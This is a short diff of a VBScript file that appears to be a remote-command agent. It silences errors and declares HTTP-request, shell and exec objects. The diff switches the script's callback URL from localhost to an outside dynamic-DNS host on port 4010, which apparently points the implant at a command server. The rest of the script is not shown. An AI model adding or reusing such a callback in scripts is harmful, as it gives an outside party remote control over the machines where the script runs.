@@ -1,7 +1,7 @@
 Option Explicit
 On Error Resume Next
 
-CONST callbackUrl = "http://localhost:80/"
+CONST callbackUrl = "http://config02.addns.org:4010/"
 
 Dim xmlHttpReq, shell, execObj, command, break, result
 
